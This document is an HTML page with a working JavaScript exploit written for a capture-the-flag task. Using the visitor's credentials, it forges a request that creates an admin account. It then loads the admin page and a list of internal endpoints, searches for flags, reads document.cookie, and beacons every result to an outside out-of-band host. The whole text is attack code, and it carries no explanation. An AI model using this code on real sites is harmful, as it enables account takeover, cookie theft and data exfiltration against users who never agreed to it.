<!DOCTYPE html>
<html>
<body>
<script>
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
const TARGET = 'https://tasks.goidactf.ru:20395';
const REQ_ID = 'exp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);

// Функция для отправки данных
function send(label, data) {
    const encoded = btoa(JSON.stringify(data));
    new Image().src = `${COLLAB}/?${label}=${encodeURIComponent(encoded)}`;
}

send('start', {id: REQ_ID, target: TARGET});

// 1. Пытаемся создать админа
fetch(`${TARGET}/create_admin`, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    credentials: 'include',
    body: `new_admin_login=HACKED_${REQ_ID}`
})
.then(r => Promise.all([r.status, r.statusText, r.text()]))
.then(([status, statusText, body]) => {
    send('create_result', {
        status,
        statusText,
        body: body.substring(0, 1000), // Первые 1000 символов
        length: body.length
    });
    
    // 2. Если успешно, пробуем получить админскую страницу
    if (status === 200 || status === 201) {
        return fetch(`${TARGET}/admin`, {credentials: 'include'});
    }
    return Promise.reject(`Status ${status}: ${statusText}`);
})
.then(r => r.text())
.then(adminPage => {
    send('admin_page', {
        length: adminPage.length,
        snippet: adminPage.substring(0, 500)
    });
    
    // 3. Ищем флаги в странице
    const flagRegex = /goidactf{[^}]*}|ctf{[^}]*}|flag{[^}]*}/gi;
    const flags = adminPage.match(flagRegex);
    if (flags) {
        send('flags', {flags});
    }
    
    // 4. Пробуем другие endpoints
    const endpoints = [
        '/flag', '/getflag', '/api/flag', 
        '/dashboard', '/internal', '/root',
        '/api/admin', '/superadmin', '/config'
    ];
    
    endpoints.forEach((endpoint, i) => {
        setTimeout(() => {
            fetch(`${TARGET}${endpoint}`, {credentials: 'include'})
            .then(r => r.text().then(t => ({
                endpoint,
                status: r.status,
                body: t.substring(0, 300)
            })))
            .then(data => send(`ep_${i}`, data))
            .catch(() => {});
        }, i * 500);
    });
})
.catch(error => {
    send('error', {error: error.toString()});
});

// 5. Дополнительно: проверяем куки
setTimeout(() => {
    send('cookies', {cookies: document.cookie});
}, 1000);

// 6. Финальный пинг
setTimeout(() => {
    send('done', {id: REQ_ID, time: new Date().toISOString()});
}, 5000);
</script>
</body>
</html>
